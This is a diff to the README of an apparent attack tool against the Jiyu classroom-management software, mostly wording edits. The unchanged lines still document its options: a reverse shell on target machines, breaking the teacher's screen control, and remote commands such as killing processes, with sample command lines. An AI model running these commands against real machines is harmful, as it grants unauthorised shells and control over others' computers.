@@ -64,7 +64,7 @@ Available options for `<Extra Option>` of `-e` argument:
 | `g` | Get your current IP address and the port which Student Terminal listens to. |
 | `nc` | Reverse shell. Needs Internet access on target machine. Use command `exit` to exit. |
 | `break` | Get out of screen control. Needs administrator access. |
-| `continue` | Recover screen control. |
+| `continue` | Recover screen control. Needs administrator access. |
 
 Target IP available for `<IP>` of `-i(--ip)` argument:
 - A direct IP. eg. `192.168.1.1`
@@ -90,6 +90,7 @@ main -e break
 
 3. Recover screen control:
 
+Needs administrator access for the same reason.
 ```bash
 main -e continue
 ```
@@ -120,7 +121,7 @@ main -i 192.168.1.1 -c "taskkill /f /im chrome.exe"
 
 6. Reverse shell:
 
-The ip of target machine should **not** be a segment.
+The IP of target machine should **not** be a segment.
 ```bash
 main -i 192.168.1.1 -e nc
 ```
@@ -172,8 +173,8 @@ Inspired by: [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_att
 
 ## Acknowledgments
 - [ht0Ruial/Jiyu_udp_attack](https://github.com/ht0Ruial/Jiyu_udp_attack): The template for this code's development.
-- [imengyu/JiYuTrainer](https://github.com/imengyu/JiYuTrainer): Provided reference C++ code.
-- <https://mivik.cn/compress.html>: For the amazing code compression tool!
+- [imengyu/JiYuTrainer](https://github.com/imengyu/JiYuTrainer): Provided C++ code reference.
+- <https://mivik.moe/compress.html>: For the amazing code compression tool!
 
 ## License
 [MIT License](https://github.com/pbw-Kevin/Jiyu-UDP-Attack-Cpp/blob/main/LICENSE)
